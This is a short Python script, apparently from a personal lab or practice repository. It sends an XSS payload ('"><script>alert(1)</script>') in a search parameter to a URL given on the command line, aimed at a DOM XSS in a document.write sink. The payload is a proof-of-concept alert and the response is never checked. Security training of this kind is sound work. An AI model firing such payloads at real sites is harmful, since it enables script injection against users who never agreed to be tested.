#!/usr/bin/env python3 
# https://github.com/wvverez
# DOM XSS in document.write sink using source location.search

import sys
import requests

def main():
    if len(sys.argv) != 2:
        print("[+] Mode of use: python3 XSS_3.py (url)")
        sys.exit(1)

    url = sys.argv[1]
    payload = '"><script>alert(1)</script>'
    response = requests.get(url + f"?search={payload}")
  
if __name__ == '__main__':
    main()
